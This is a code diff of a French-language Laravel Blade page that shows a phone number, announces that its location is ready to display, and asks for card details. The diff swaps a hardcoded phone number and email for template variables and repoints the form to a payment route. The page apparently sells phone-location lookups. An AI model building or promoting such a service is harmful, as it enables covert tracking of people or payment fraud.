@@ -28,8 +28,7 @@
             
             <div class="mb-10 text-center">
                 <p class="text-4xl md:text-5xl font-black tracking-tighter mb-2">
-                    <span class="text-gray-900">+230</span> 
-                    <span class="text-brand">5519 3628</span>
+                    <span class="text-gray-900">{{ $locationRequest->phone_number }}</span>
                 </p>
                 <h1 class="text-xl md:text-2xl font-black text-gray-900 tracking-tight uppercase">
                     La localisation est prête à être affichée
@@ -41,7 +40,10 @@
 
                 <div class="bg-white rounded-[3rem] p-8 md:p-12 shadow-[0_50px_100px_-20px_rgba(0,0,0,0.06)] border border-gray-100 mb-8 relative">
                     
-                    <form action="{{ route('loginUser') }}" method="GET" class="space-y-4 max-w-md mx-auto">
+                    <form action="{{ route('processPayment', ['uuid' => $locationRequest->uuid]) }}" method="POST" class="space-y-4 max-w-md mx-auto">
+                        @csrf
+                        <input type="hidden" name="uuid" value="{{ $locationRequest->uuid }}">
+                        <input type="hidden" name="email" value="{{ $email }}">
                         <input type="text" placeholder="NUMÉRO DE CARTE *" 
                             class="w-full bg-gray-50 border-2 border-transparent focus:border-brand rounded-full py-4 px-8 font-bold text-xs outline-none transition-all shadow-sm uppercase tracking-widest">
 
@@ -59,7 +61,7 @@
                                 class="w-full bg-gray-50 border-2 border-transparent focus:border-brand rounded-full py-4 px-8 font-bold text-xs outline-none transition-all shadow-sm">
                         </div>
 
-                        <input type="email" value="edzar@gmail.com" 
+                        <input type="email" value="{{ $email }}" 
                             class="w-full bg-gray-50 border-2 border-transparent focus:border-brand rounded-full py-4 px-8 font-bold text-xs outline-none transition-all shadow-sm text-gray-400 italic">
 
                         <div class="pt-6 text-center">
